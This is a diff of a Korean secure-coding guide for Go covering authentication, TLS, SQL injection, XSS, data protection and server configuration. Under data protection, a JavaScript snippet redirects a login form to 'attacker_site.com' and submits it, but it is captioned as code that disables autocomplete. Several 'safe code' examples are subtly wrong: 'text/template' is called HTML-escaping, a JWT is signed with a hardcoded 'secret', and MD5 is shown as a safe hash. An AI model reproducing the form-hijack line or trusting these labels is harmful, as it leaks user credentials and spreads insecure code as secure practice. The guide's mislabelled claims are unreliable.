@@ -2,34 +2,28 @@
 
 ## access-control
 
-* 다음 코드는 현재 시각으로부터 30분간 토큰과 쿠키를 생성시키는 코드입니다.  
-  시간이 지나면 만료가 되어, 토큰과 쿠키를 재발급해야 합니다.<br/><br/>
 **_안전한 코드_**
 ```golang
+// 현재 시각으로부터 30분간 토큰과 쿠키를 생성시키는 코드  
+// 시간이 지나면 만료가 되어, 토큰과 쿠키를 재발급 해야함
+
     expireToken := time.Now().Add(time.Minute * 30).Unix()
     expireCookie := time.Now().Add(time.Minute * 30)
 ```
 <br/>
 
-* JWT라고 불리는 JSON의 웹 토큰을 사용하여 인증을 강화합니다.
-> **NewWithClaims** = 함수에 원하는 서명 메소드와 자신이 정의한 구조체를 넣어두는 곳  
-> **SignedString** = jwt.NewWithClaims 함수로부터 값을 전달받고 토큰을 서명한다<br/><br/>
-
-**_안전한 코드_**
 ```golang
+// JWT라고 불리는 JSON의 웹 토큰을 사용하여 인증을 강화합니다.
+// NewWithClaims = 함수에 원하는 서명 메소드와 자신이 정의한 구조체를 넣어두는 곳  
+// SignedString = jwt.NewWithClaims 함수로부터 값을 전달받고 토큰을 서명한다.
+
     token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
     signedToken, _ := token.SignedString([]byte("secret"))
 ```
 <br/>
 
-* JWT를 임포트하기 위해서 다음과 같은 코드를 작성합니다.
 ```golang
-   "github.com/dgrijalva/jwt-go"
-```
-<br/>
-
-* 저장할 데이터의 JWT 스키마의 작성 예시는 다음과 같습니다
-```golang
+// 저장할 데이터의 JWT 스키마의 작성 예시는 다음과 같음
     type Claims struct {
       Username string `json:"username"`
       jwt.StandardClaims
@@ -37,17 +31,19 @@
 ```
 <br/>
 
-* 다음 코드는 쿠키 파라미터를 세팅하는 코드이다.  
-30분 후 만료되며, HTTP 전용이다. 경로와 도메인도 설정되어 있다.
 ```golang
+// 다음 코드는 쿠키 파라미터를 세팅하는 코드이다.  
+// 30분 후 만료되며, HTTP 전용이다. 경로와 도메인도 설정되어 있다.
+
 cookie := http.Cookie{Name: "Auth", Value: signedToken, Expires: expireCookie, HttpOnly: true, Path: "/", Domain: "127.0.0.1", Secure: true}
 http.SetCookie(res, &cookie)
 http.Redirect(res, req, "/profile", http.StatusTemporaryRedirect)
 ```
 <br/>
 
-* 이번 함수는 개인 페이지를 보호해주는 기능을 수행한다.
 ```golang
+// 이번 함수는 개인 페이지를 보호해주는 기능을 수행한다.
+
 func validate(page http.HandlerFunc) http.HandlerFunc {
 	return func(res http.ResponseWriter, req *http.Request) {
 		cookie, err := req.Cookie("Auth")
@@ -85,8 +81,9 @@ func validate(page http.HandlerFunc) http.HandlerFunc {
 ```
 <br/>
 
-* 이번 코드에 나오는 함수는 클라이언트에 유효한 토큰이 있는 경우에만 볼 수 있게 해주는 기능을 수행한다
 ```golang
+// 이 함수는 클라이언트에 유효한 토큰이 있는 경우에만 볼 수 있게 해주는 기능을 수행한다.
+
 func protectedProfile(res http.ResponseWriter, req *http.Request) {
 	claims, ok := req.Context().Value(MyKey).(Claims)
 	if !ok {
@@ -110,8 +107,8 @@ func protectedProfile(res http.ResponseWriter, req *http.Request) {
 ```
 <br/>
 
-* 다음 코드는 쿠키를 제거하는 역할을 수행한다
 ```golang
+// 이 코드는 쿠키를 제거하는 역할을 수행한다.
 func logout(res http.ResponseWriter, req *http.Request) {
 	deleteCookie := http.Cookie{Name: "Auth", Value: "none", Expires: time.Now()}
 	http.SetCookie(res, &deleteCookie)
@@ -119,17 +116,19 @@ func logout(res http.ResponseWriter, req *http.Request) {
 ```
 
 ## communication-security
-* 다음은 TLS를 통해 인증을 수행하는 코드이다.  
-<br/><br/>
+
 **_취약한 코드_**
 ```golang
+// 검증의 과정을 제대로 수행하지 않기 때문에 취약해질 가능성이 있다.
+
    log.Fatal(http.ListenAndServeTLS(":443", "yourCert.pem", "yourKey.pem", nil))
 ```
-이 코드는 검증의 과정을 제대로 수행하지 않기 때문에 취약해질 가능성이 있다.<br/><br/>
+<br/>
 
-* 그래서 다음과 같은 코드로 검증을 하는 것이 중요하다.<br/><br/>
 **_안전한 코드_**
 ```golang
+// 다음처럼 검증을 하는 것이 중요하다.
+
  var certs []Certificates
     certs = append(certs, Certificates{
         CertFile: "../etc/yourSite.pem", //본인 사이트의 인증서 키 
@@ -147,9 +146,10 @@ func logout(res http.ResponseWriter, req *http.Request) {
 ```
 <br/>
 
-* 다음은 WebSocket에서 보안을 수행하는 과정이다.  
-Header에서 값을 가져와, 값이 호스트와 같은지 비교한다. 같지 않으면 에러가 발생한다.
 ```golang
+// WebSocket에서 보안을 수행하는 과정임  
+// Header에서 값을 가져와, 값이 호스트와 같은지 비교
+// 같지 않으면 에러가 발생
 	if r.Header.Get("Origin") != "http://"+r.Host{
 		http.Error(w, "Origin not allowed", 403)
 			return
@@ -157,6 +157,7 @@ Header에서 값을 가져와, 값이 호스트와 같은지 비교한다. 같�
 		websocket.Handler(EchoHandler).ServeHTTP(w, r)
 	}
 ```
+<br/>
 
 ## data_protection
 
@@ -192,26 +193,29 @@ fmt.Println(string(decrypted))
 ```
 <br/>
 
-* 이 코드에서 취약점이 발생할 수 있다.  
-복호화를 하는 과정에서, 암호화 할 때 사용한 것과 동일한 nonce와 키를 사용하지 않았고,  
-이 과정에서 취약점으로 이어질 수 있다.<br/><br/>
-**_취약점 코드_**
+**_취약한 코드_**
 ```golang
+// 복호화를 하는 과정에서, 암호화 할 때 사용한 것과 동일한 nonce와 키를 사용하지 않았고,  
+// 이 과정에서 취약점으로 이어질 수 있다.
+
 var decryptNonce [24]byte
 copy(decryptNonce[:], encrypted[:24])
 decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], &decryptNonce, &secretKey)
 ```
 <br/>
 
-* 데이터를 보호하는 방법은 여러가지 있는데, 그 중 하나가 비활성화이다.  
+**_안전한 코드_**
 ```golang
+// 데이터를 보호하는 방법은 여러가지 있는데, 그 중 하나가 비활성화이다.  
+// 특정 양식에서 자동완성을 비활성화 하는 방법이다.
 <form method="post" action="/form" autocomplete="off">
 <input type="text" id="cc" name="cc" autocomplete="off">
 ```
-특정 양식에서 자동완성을 비활성화 하는 방법이다.<br/><br/>
+<br/>
 
-* 이번 코드는 로그인 양식에서 자동완성을 비활성화 하는 코드이다.
 ```golang
+// 로그인 양식에서 자동완성을 비활성화 하는 코드이다.
+
 window.setTimeout(function() {
   document.forms[0].action = 'http://attacker_site.com';
   document.forms[0].submit();
@@ -220,15 +224,19 @@ window.setTimeout(function() {
 ```
 <br/>
 
-* 이 코드는 민감한 정보가 포함된 페이지의 캐시 제어를 비활성화 하는 코드이다.
 ```golang
+// 민감한 정보가 포함된 페이지의 캐시 제어를 비활성화 하는 코드이다.
 w.Header().Set("Cache-Control", "no-cache, no-store")
 w.Header().Set("Pragma", "no-cache")
 ```
+<br/>
 
 ## file_management
-* 파일 관리에서 보안 설정을 하는 방법은 다음과 같다.  
+
+**_안전한 코드_**
 ```golang
+// 파일 관리에서 보안 설정을 하는 방법은 다음과 같다.  
+
 {...}
 buff := make([]byte, 512)
 _, err = file.Read(buff)
@@ -236,6 +244,7 @@ _, err = file.Read(buff)
 
 filetype := http.DetectContentType(buff)
 
+// 버퍼에 쓰여진 데이터를 보고 파일 타입을 지정한 다음에, 지정한 파일 타입만 허용하는 코드
 {...}
 switch filetype {
 case "image/jpeg", "image/jpg":
@@ -249,13 +258,14 @@ default:
 }
 {...}
 ```
-이 코드는 버퍼에 쓰여진 데이터를 보고 파일 타입을 지정한 다음에, 지정한 파일 타입만 허용하는 코드이다.<br/><br/>
 
 ## output-encoding
-* 다음에 나오는 코드는 SQL Injection에 취약한 코드이다.  
-변수값이 그대로 쿼리에 주입되기 때문에 취약하다고 볼 수 있다.<br/><br/>
+
 **_취약한 코드_**
 ```golang
+// 다음에 나오는 코드는 SQL Injection에 취약한 코드이다.  
+// 변수값이 그대로 쿼리에 주입되기 때문에 취약하다고 볼 수 있다.
+
 func main(){
 	ctx:=context.Background()
 	customerId := r.URL.Query.Get("id")
@@ -266,10 +276,11 @@ func main(){
 ```
 <br/>
 
-* SQL Injection으로부터 안전해지기 위해, 다음과 같은 코드를 작성한다.  
-SQL Injection을 시도하려고 해도 '?' 때문에 쿼리로 인식하지 않게 한다.<br/>
 **_안전한 코드_**
 ```golang
+// SQL Injection으로부터 안전해지기 위해, 다음과 같은 코드를 작성한다.  
+// SQL Injection을 시도하려고 해도 '?' 때문에 쿼리로 인식하지 않게 한다.
+
 func main(){
 	ctx:=context.Background()
 	customerId := r.URL.Query.Get("id")
@@ -280,10 +291,11 @@ func main(){
 ```
 <br/>
 
-* 다음은 XSS에 취약해지게 되는 코드이다.  
-입력값을 검증하는 과정을 거치지 않는다.<br/><br/>
 **_취약한 코드_**
 ```golang
+// 다음은 XSS에 취약해지게 되는 코드이다.  
+// 입력값을 검증하는 과정을 거치지 않는다.
+
 package main
 
 import "net/http"
@@ -300,7 +312,6 @@ func main () {
 ```
 <br/>
 
-* XSS로부터 안전해지려면, 다음과 같이 코드를 작성한다.<br/><br/>
 **_안전한 코드_**
 ```golang
 package main
@@ -323,48 +334,51 @@ func main() {
 ```
 <br/>
 
-* 이 패키지는 HTML 출력을 자동으로 보호해주는 패키지이다.
 ```golang
+// 이 패키지는 HTML 출력을 자동으로 보호해주는 패키지이다.
 import "text/template"
 ```
 <br/>
 
-* 이 과정에서 HTML 템플릿의 문맥을 자동으로 이스케이프 해준다.
 ```golang
+// 이 과정에서 HTML 템플릿의 문맥을 자동으로 이스케이프 해준다.
         tmpl := template.New("hello")
         tmpl, _ = tmpl.Parse(`{{define "T"}}{{.}}{{end}}`)
         tmpl.ExecuteTemplate(w, "T", param1)
 ```
 
-## system_configuration
-* 서버 설정도 제대로 해야, 애플리케이션이 안전하다.  
-다음 코드는 디렉토리 인덱싱 공격에 취약한 코드다.
+## system_configuration.  
+
+**_취약한 코드_**
 ```golang
+// 디렉토리 인덱싱 공격에 취약한 코드다.
+// FileServer 메소드는 서버에 저장된 파일들을 보여준다.  
+// 이 과정에서 보여주길 원하지 않는 파일도 보여줄 수 있게 된다.
+
 http.ListenAndServe(":8080", http.FileServer(http.Dir("/tmp/static")))
 ```
-FileServer 메소드는 서버에 저장된 파일들을 보여준다.  
-이 과정에서 보여주길 원하지 않는 파일도 보여줄 수 있게 된다.
-<br/>
 
-#### 공격으로부터 안전하게 하는 서버의 설정은 여러가지이다.  
-<br/>
-* 이 코드를 작성하면 Proto는 무시되고 HTTP/1.1을 사용하여 요청하게 된다.
+**_안전한 코드_** 
 ```golang
+// Proto는 무시되고 HTTP/1.1을 사용하여 요청하게 된다.
+
 req, _ := http.NewRequest("POST", url, buffer)
 req.Proto = "HTTP/1.0"
 ```
 <br/>
 
-* 다음과 같은 코드는 디렉토리 목록을 비활성화 하게 하는 코드이다.
 ```golang
+// 디렉토리 목록을 비활성화 하게 하는 코드이다.
+
 type justFilesFilesystem struct {
     fs http.FileSystem
 }
 ```
 <br/>
 
-* 다음 코드는 요청된 경로와 파일이 표시될 수 있는지의 여부를 확인하는 기능을 수행한다.
 ```golang
+// 요청된 경로와 파일이 표시될 수 있는지의 여부를 확인하는 기능을 수행한다.
+
 func (fs justFilesFilesystem) Open(name string) (http.File, error) {
     f, err := fs.fs.Open(name)
     if err != nil {
@@ -375,27 +389,30 @@ func (fs justFilesFilesystem) Open(name string) (http.File, error) {
 ```
 <br/>
 
-* 다음 코드는 tmp/static/ 경로만 표시하도록 하는 기능을 수행한다.
 ```golang
+// tmp/static/ 경로만 표시하도록 하는 기능을 수행한다.
+
 fs := justFilesFilesystem{http.Dir("tmp/static/")}
 http.ListenAndServe(":8080", http.StripPrefix("/tmp/static", http.FileServer(fs)))
 ```
 <br/>
 
-* 다음 코드는 X-Request-With 헤더를 Go vulnerable Framework 1.2로 설정하는 코드이다.
 ```golang
+// X-Request-With 헤더를 Go vulnerable Framework 1.2로 설정하는 코드이다.
+
 w.Header().Set("X-Request-With", "Go Vulnerable Framework 1.2")
 ```
 <br/>
 
-* 다음 코드는 POST, GET 메소드만 허용하게 하는 코드이다.
 ```golang
+// POST, GET 메소드만 허용하게 하는 코드이다.
 w.Header().Set("Access-Control-Allow-Methods", "POST, GET")
 ```
 <br/>
 
-* 다음 설정은 Allow에 나온 경로만 허용하고 나머지는 전부 거부하는 설정이다.
 ```golang
+// Allow에 명시된 경로만 허용하고 나머지는 전부 거부하는 설정이다
+
 User-agent: *
 Allow: /sitemap.xml
 Allow: /index
@@ -407,8 +424,7 @@ Disallow: /
 
 ## Authentication-Password-Management
 
-
-**_안전한 코드 [ 통신 인증 데이터 ]_**
+**_안전한 코드_**
 ```golang
 // 패스워드를 비활성화한다.
 // password Type을 사용함으로써 패스워드가 사용자 화면에서 보이지 않게 한다.
@@ -443,7 +459,7 @@ Disallow: /
 ```
 <br/>
 
-**_안전한 코드 [ 검증 및 저장 ]_**
+**_안전한 코드_**
 ```golang
 package main
 
@@ -517,7 +533,7 @@ data := F⁻¹(encrypted_data, key)
 ```
 <br/>
 
-**_안전한 코드 [ 암호 ]_**
+**_안전한 코드_**
 ```golang
 func main () {
         h_md5 := md5.New()
@@ -537,4 +553,228 @@ func main () {
         fmt.Printf("SHA256     : %x\n", h_sha.Sum(nil))
         fmt.Printf("Blake2s-256: %x\n", h_blake2s.Sum(nil))
 }
+```
+<br/>
+
+## database-security
+
+**_취약한 코드_**
+```golang
+// 입력값을 따로 검증하지 않아, 사용자 ID에 대한 모든 정보에 액세스 할 수 있음
+SELECT * FROM tblUsers WHERE userId = $user_input
+```
+
+**_안전한 코드_**
+
+```golang
+// 파라미터를 받아서 매개변수화 시켜 '?' 변수에 할당
+// SQL Injection 예방
+customerName := r.URL.Query().Get("name")
+db.Exec("UPDATE creditcards SET name=? WHERE customerId=?", customerName, 233, 90)
+```
+<br/>
+
+```golang
+// 저장 프로시저를 사용하요 웹 응용 프로그램에 대한 새로운 보호 계층을 만듬
+
+// 저장 프로시저를 사용하면 일반 쿼리를 사용하는 대신 쿼리에 대한 특정 보기를 만들어 
+// 민감한 정보가 보관되지 않도록 할 수 있음
+CREATE PROCEDURE db.getName @userId int = NULL
+AS
+    SELECT name, lastname FROM tblUsers WHERE userId = @userId
+GO
+```
+<br/>
+
+```golang
+func main() {
+    db, err := sql.Open("mysql", "user:@/cxdb")
+    if err != nil {
+        log.Fatal(err)
+    }
+    p := &program{db: db}
+    p.base, p.cancel = context.WithCancel(context.Background())
+
+    // 프로그램 종료 요청 대기, 요청 시 기본 컨텍스트 취소
+    go func() {
+        osSignal := // ...
+        select {
+        case <-p.base.Done():
+        case <-osSignal:
+            p.cancel()
+        }
+        // 선택적으로 OS를 호출하기 전에 N 밀리초 동안 기다림.
+    }()
+
+    err =  p.doOperation()
+    if err != nil {
+        log.Fatal(err)
+    }
+}
+```
+<br/>
+
+```golang
+<connectionDB>
+  <serverDB>localhost</serverDB>
+  <userDB>f00</userDB>
+  <passDB>f00?bar#ItsP0ssible</passDB>
+</connectionDB>
+```
+<br/>
+
+```golang
+// Go파일에서 DB설정 파일을 호출함
+configFile, _ := os.Open("../private/configDB.xml")
+
+// 파일을 읽고 데이터베이스 연결을 만듬
+db, _ := sql.Open(serverDB, userDB, passDB)
+```
+<br/>
+
+## error-handling-logging
+
+**_안전한 코드_**
+```golang
+if err != nil {
+    // 오류 처리
+}
+
+// 오류 출력 예시
+{...}
+if f < 0 {
+    return 0, errors.New("math: square root of negative number")
+}
+//에러가 발생하면 에러를 출력함
+if err != nil {
+    fmt.Println(err)
+}
+{...}
+
+
+// 오류가 발생한다면 정상 실행으로 돌아갈 수 있도록 하는 코드
+func main () {
+    start()
+    fmt.Println("Returned normally from start().")
+}
+
+func start () {
+    defer func () {
+        if r := recover(); r != nil {
+            fmt.Println("Recovered in start()")
+        }
+    }()
+    fmt.Println("Called start()")
+    part2(0)
+    fmt.Println("Returned normally from part2().")
+}
+
+func part2 (i int) {
+    if i > 0 {
+        fmt.Println("Panicking in part2()!")
+        panic(fmt.Sprintf("%v", i))
+    }
+    defer fmt.Println("Defer in part2()")
+    fmt.Println("Executing part2()")
+    part2(i + 1)
+}
+```
+<br/>
+
+```golang
+// 성공적인 보안 이벤트와 실패한 보안 이벤트를 모두 다뤄야 함
+func main() {
+    var buf bytes.Buffer
+    var RoleLevel int
+
+    logger := log.New(&buf, "logger: ", log.Lshortfile)
+
+    fmt.Println("Please enter your user level.")
+    fmt.Scanf("%d", &RoleLevel) //<--- example
+
+    switch RoleLevel {
+    case 1:
+        // 로그인 성공
+        logger.Printf("Login successful.")
+        fmt.Print(&buf)
+    case 2:
+        // 실패한 로그인
+        logger.Printf("Login unsuccessful - Insufficient access level.")
+        fmt.Print(&buf)
+     default:
+        // 지정되지 않은 오류
+        logger.Print("Login error.")
+        fmt.Print(&buf)
+    }
+}
+
+
+// 암호화 해시 함수를 추가하여 로그 변조가 발생하지 않도록 함
+{...}
+
+// 체크섬 파일에서 알려진 로그 체크섬을 가져옴
+logChecksum, err := ioutil.ReadFile("log/checksum")
+str := string(logChecksum) // 내용을 문자열로 반환
+
+// 현재 로그의 SHA256 해시 계산
+b, err := ComputeSHA256("log/log")
+if err != nil {
+  fmt.Printf("Err: %v", err)
+} else {
+  hash := hex.EncodeToString(b)
+  // 계산된 해시를 저장된 해시와 비교함
+
+  if str == hash {
+    // 확인 체크섬이 일치
+    fmt.Println("Log integrity OK.")
+  } else {
+    // 파일 무결성이 손상됨
+    fmt.Println("File Tampering detected.")
+  }
+}
+{...}
+```
+<br/>
+
+## input-validation
+**_안전한 코드_**
+```golang
+func main() {
+ // serveMux는 들어오는 요청을 등록된 패턴과 일치시키는 데 사용됨
+ // 요청된 URL과 가장 근접하게 일치하는 핸들러를 호출함
+  mux := http.NewServeMux()
+
+  rh := http.RedirectHandler("http://yourDomain.org", 307)
+  mux.Handle("/login", rh)
+
+  log.Println("Listening...")
+  http.ListenAndServe(":3000", mux)
+}
+```
+<br/>
+
+## memory-management
+```golang
+// go에서는 string이 null로 끝나지 않는다
+type StringHeader struct {
+    Data uintptr
+    Len  int
+}
+
+func main() {
+    strings := []string{"aaa", "bbb", "ccc", "ddd"}
+    // 루프는 MAP 길이를 확인하지 않는다
+    for i := 0; i < 5; i++ {
+        if len(strings[i]) > 0 {
+            fmt.Println(strings[i])
+        }
+    }
+}
+
+// 출력
+aaa
+bbb
+ccc
+ddd
+panic: runtime error: index out of range
 ```
